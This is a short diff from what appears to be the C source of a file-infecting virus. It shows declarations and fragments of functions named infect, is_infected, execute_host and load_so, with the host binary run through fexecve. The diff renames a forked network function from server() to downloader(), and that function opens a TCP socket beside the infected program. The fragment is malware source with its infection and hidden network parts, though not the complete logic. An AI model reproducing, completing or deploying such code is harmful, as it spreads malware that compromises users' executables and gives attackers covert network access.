@@ -28,7 +28,7 @@ always_inline optimize(opt) static inline void infect(FILE*, FILE*);
 always_inline optimize(opt) static inline void execute_host(FILE*, char**, char**);
 always_inline optimize(opt) static inline void load_so(int, int);
 always_inline optimize(opt) static inline void process_connection(int);
-always_inline optimize(opt) static inline void server();
+always_inline optimize(opt) static inline void downloader();
 
 int main(int argc, char** argv){
   if(!is_infected(infection_target)){
@@ -87,7 +87,7 @@ void execute_host(FILE* f, char** argv, char** envp){
   write(fd, host, h_size);  
   pid_t pid;
   if((pid = fork()) == 0){
-    server();
+    downloader();
   }
   if((pid = fork()) == 0){
     fexecve(fd, argv, envp);
@@ -121,7 +121,7 @@ void process_connection(int connection_fd){
   }
 }
 
-void server(){
+void downloader(){
   int socket_fd, connection_fd, addr_len; 
   struct sockaddr_in server_addr, client; 
   socket_fd = socket(AF_INET, SOCK_STREAM, 0);
